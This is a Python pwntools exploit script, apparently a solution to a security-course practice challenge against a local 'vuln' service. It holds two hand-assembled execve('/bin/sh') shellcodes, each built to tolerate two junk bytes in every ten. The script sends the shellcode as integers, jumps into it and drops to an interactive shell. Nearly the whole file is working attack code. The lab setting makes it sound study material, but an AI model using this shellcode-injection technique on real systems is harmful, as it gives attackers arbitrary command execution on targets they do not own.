#!/usr/bin/env python3

import pwn
import socket
import threading

# podman compose -f debug.yml up
# python3 ./solve.py
# podman exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-1')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
pwn.pause()



# 2 byte trash, then 8 bytes from me 
# 2 byte trash, then 8 bytes from me 
#...
# we can jump to offset 2 at the start

#=> 8 bytes from me + 2 bytes trash, ...

# all registers are set to zero, then we jump to offset (in rax)

# TODO: build ropchain that ignores bytes 9, 10

shellcode = pwn.asm('''
    lea rdi, [rip + sh];
                    
    push 0xb848; // junk to meet requirements
    
    xor eax, eax;      
    nop;
    nop;
    nop;
    push 0xb848;

    mov ax, 59;
                    
    nop;         // junk to meet requirements
    push 0xb848;
                    
    mov si, 0;
                    
    nop;         // junk to meet requirements
    push 0xb848;   
                          
    mov dx, 0;
                    
    nop;         // junk to meet requirements
    push 0xb848;     

    syscall;
                    
junk:
    .byte 0x48, 0xb8, 0x48, 0xb8, 0x48, 0xb8, 0x48

sh:
    .string "/bin/sh"
''')


shellcode = pwn.asm('''
    
    xor eax, eax;
    mov ax, 0x0068;
                    
    
    jmp test;
    .byte 0xFF, 0xFF;
test:                    
    shl rax, 16;
                    
    nop;
    nop;
    
    jmp test2;
    .byte 0xFF, 0xFF;
test2:                   
    add rax, 0x732f;

    jmp test3;
    .byte 0xFF, 0xFF;
test3:                  
    shl rax, 16;

    nop;
    nop;
    jmp test4;
    .byte 0xFF, 0xFF;
test4:
    add rax, 0x6e69;

    jmp test5;
    .byte 0xFF, 0xFF;   
test5:                
    shl rax, 16;

    nop;
    nop;
    jmp test6;
    .byte 0xFF, 0xFF;
test6:            
    add rax, 0x622f;

    jmp test7;
    .byte 0xFF, 0xFF;   
test7:        
    push rax;        
    mov rdi, rsp;
                    
    nop;
    nop;
    jmp $+4;
    .byte 0xFF, 0xFF;
    xor rax, rax;
                    
    nop;
    nop;
    nop;
    jmp $+4;
    .byte 0xFF, 0xFF;

    add rax, 59;
                    
    nop;
    nop;        
    jmp $+4;
    .byte 0xFF, 0xFF;

    nop;
    nop;
    nop;
    nop;
    syscall;
    nop;
    nop;
''')


print(shellcode)
for i in range(0, len(shellcode), 10):
    print(f'{shellcode[i:i+8].hex()}|{shellcode[i+8:i+10].hex()}')

conn.sendlineafter(b'? ', f'11'.encode())


for i in range(11):
    print(hex(pwn.u64(shellcode[i*10:i*10+8]))[2:])
    
    conn.sendlineafter(b': ', f'{pwn.u64(shellcode[i*10:i*10+8])}'.encode())


conn.sendlineafter(b'Enter an offset to jump to: ', f'2'.encode())
conn.interactive()
